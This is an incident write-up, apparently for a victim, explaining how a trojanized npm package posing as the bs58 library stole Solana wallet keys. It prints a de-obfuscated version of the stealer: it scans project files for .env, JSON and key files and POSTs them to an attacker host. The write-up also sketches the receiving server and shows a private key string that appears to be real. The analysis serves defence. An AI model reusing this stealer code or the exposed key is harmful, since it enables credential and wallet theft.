# Complete Process Flow: How Your Keys Were Stolen

## Overview

Your keys were stolen by a **malicious npm package** that masqueraded as legitimate code. The package `@validate-sdk/v2` (or similar) was installed as a dependency, likely through `@solana-launchpad/sdk` or another package.

## The Complete Flow

### Step 1: You Run Your Bundler
```
You execute: npm start (or similar)
```

### Step 2: Your Code Imports the SDK
Your code imports a package that depends on the malicious package:
```javascript
// Your code (e.g., index.ts or similar)
import { PumpFunSDK } from "@solana-launchpad/sdk"
// OR
import something from "some-package-that-uses-validator"
```

### Step 3: Malicious Package Loads Automatically
When Node.js loads the SDK, it automatically requires the malicious package:
```javascript
// Inside @solana-launchpad/sdk/dist/index.js (or similar)
var v2 = require('@validate-sdk/v2');
// This immediately executes the malicious code
```

### Step 4: The "bs58()" Function is Actually Malware
The malicious package (`@validate-sdk/v2/dist/index.cjs`) exports a function called `bs58()`, but **it's not the real bs58 library**. It's a trojan horse that:

1. **Scans your entire project directory** recursively
2. **Finds sensitive files** matching these patterns:
   - `.env` files
   - `.json` files (except `package-lock.json` and `tsconfig.json`)
   - `.key` files
   - Files with "setting", "config", "key", "encrypt", "decrypt", "util" in the filename
3. **Skips `node_modules`** directory (to avoid scanning dependencies)
4. **Reads the contents** of all matching files into memory

### Step 5: Malware Prepares Data for Exfiltration
The malware creates a JSON payload containing:
```json
{
  "content": [
    {
      "file": "C:\\Users\\emilk\\Desktop\\my-utility\\pumpfun bundler\\.env",
      "data": "PRIVATE_KEY=4a8pzuRmmVvSpqop7LYn7jNY74rfCn5P3ikwbP5rhXqCUfABFXMWDJXvVNUWhgXiKDvrU5Tu7pCCgx9Rm6NfTJ3Y\n..."
    },
    {
      "file": "C:\\Users\\emilk\\Desktop\\my-utility\\pumpfun bundler\\keys\\intermediary-wallets.json",
      "data": "{\"hop1\":[{\"publicKey\":\"...\",\"privateKey\":\"...\"}]}"
    }
  ]
}
```

### Step 6: Malware Sends POST Request
The malware makes an HTTP POST request to the attacker's server:

**Request Details:**
- **URL**: `https://validator.uno/fourmeme` (or `https://jito-tip-ny.lat/program` in some versions)
- **Method**: POST
- **Headers**: 
  - `Content-Type: application/json`
- **Body**: The JSON payload with all your stolen files

**The POST request is sent using:**
- Node.js built-in `fetch()` (if available)
- Or falls back to `node-fetch` package
- Or falls back to browser `fetch()` API

### Step 7: Request Travels Over Internet
```
Your Computer 
  → Your Router 
  → Your ISP 
  → Internet Backbone 
  → Attacker's Hosting Provider (Railway/Vercel/etc) 
  → Attacker's Server (validator.uno)
```

### Step 8: Attacker's Server Receives Data
The attacker's server at `validator.uno/fourmeme` receives your data:

```javascript
// Attacker's server code (simplified)
app.post('/fourmeme', (req, res) => {
  const stolenFiles = req.body.content;
  
  // Store in database
  database.insert({
    timestamp: new Date(),
    files: stolenFiles,
    ip: req.ip,
    userAgent: req.headers['user-agent']
  });
  
  res.json({ valid: true }); // Malware thinks it succeeded
});
```

### Step 9: Data Stored in Attacker's Database
Your stolen files are stored in the attacker's database with:
- Timestamp
- Your IP address
- All file contents (including private keys)
- User agent

### Step 10: Attacker Reviews and Extracts Keys
The attacker:
1. Logs into their dashboard
2. Views all stolen data
3. Extracts private keys from `.env` and JSON files
4. Imports keys into their wallet
5. Drains your wallets

## The Malicious Package Details

### Package Name
- **Primary**: `@validate-sdk/v2` (or `@validator-lut-sdk/v3` in some cases)
- **Installed via**: Dependency of `@solana-launchpad/sdk` or similar

### Malicious Code Location
- **File**: `node_modules/@validate-sdk/v2/dist/index.cjs`
- **Exported Function**: `bs58()` (masquerading as the real bs58 library)
- **Obfuscation**: Code is heavily obfuscated with base64 and hex encoding

### What the Malware Does
The obfuscated code (when decoded) does this:

```javascript
// Simplified version of what the malware does
async function bs58() {
  // 1. Scan project directory
  const files = [];
  async function scanDir(dir) {
    const entries = await fs.readdir(dir);
    for (const entry of entries) {
      if (entry === 'node_modules') continue; // Skip dependencies
      
      const fullPath = path.join(dir, entry);
      const ext = path.extname(entry).toLowerCase();
      const name = entry.toLowerCase();
      
      // Check if file matches sensitive patterns
      if (
        entry === '.env' ||
        ext === '.json' ||
        ext === '.key' ||
        name.includes('setting') ||
        name.includes('config') ||
        name.includes('key') ||
        name.includes('encrypt') ||
        name.includes('decrypt')
      ) {
        // Read file contents
        const data = await fs.readFile(fullPath, 'utf8');
        files.push({ file: fullPath, data: data });
      }
      
      // Recursively scan subdirectories
      if (isDirectory(fullPath)) {
        await scanDir(fullPath);
      }
    }
  }
  
  await scanDir(process.cwd());
  
  // 2. Send to attacker's server
  await fetch('https://validator.uno/fourmeme', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: files })
  });
}
```

## Why You Didn't Notice

1. **Silent Execution**: The malware runs automatically when the package is imported
2. **No Errors**: It doesn't throw errors, so your code continues normally
3. **Fast**: The entire process takes < 1 second
4. **Background**: The POST request happens in the background
5. **Obfuscated**: The code is heavily obfuscated, making it hard to detect
6. **Legitimate Name**: The function is called `bs58()`, which sounds like a legitimate library

## Evidence Found

Based on your `DEMO-stolen-data.json`, the malware successfully exfiltrated:

1. **`.env` file** containing:
   - `PRIVATE_KEY=4a8pzuRmmVvSpqop7LYn7jNY74rfCn5P3ikwbP5rhXqCUfABFXMWDJXvVNUWhgXiKDvrU5Tu7pCCgx9Rm6NfTJ3Y`
   - RPC endpoints with API keys
   - Database URLs
   - OpenAI API key

2. **`keys/intermediary-wallets.json`** containing:
   - Multiple wallet private keys
   - Public keys

3. **`keys/warmed-wallets.json`** containing:
   - Additional wallet data

## The POST Request Sender

**Package**: `@validate-sdk/v2` (or `@validator-lut-sdk/v3`)

**Location**: `node_modules/@validate-sdk/v2/dist/index.cjs`

**Function**: The exported `bs58()` function (which is NOT the real bs58 library)

**Request**: HTTP POST to `https://validator.uno/fourmeme`

## Timeline

Each time you ran your bundler:
1. ✅ Malware executed automatically (< 1 second)
2. ✅ Scanned your project directory
3. ✅ Found sensitive files
4. ✅ Sent POST request to `validator.uno/fourmeme`
5. ✅ Attacker received your keys
6. ✅ Your code continued normally (you didn't notice)

## Prevention

1. **Remove the malicious package** from `node_modules`
2. **Audit your dependencies** using `npm audit`
3. **Check package.json** for suspicious dependencies
4. **Rotate all keys** that were in the stolen files
5. **Use `.gitignore`** to prevent committing sensitive files
6. **Use environment variables** properly (never commit `.env` files)
7. **Review package code** before installing (especially from unknown sources)

## Current Status

Based on your files:
- ✅ You've identified the malware
- ✅ You've created demo/test servers to understand it
- ⚠️ **You need to rotate all compromised keys immediately**
- ⚠️ **Remove the malicious package from your dependencies**
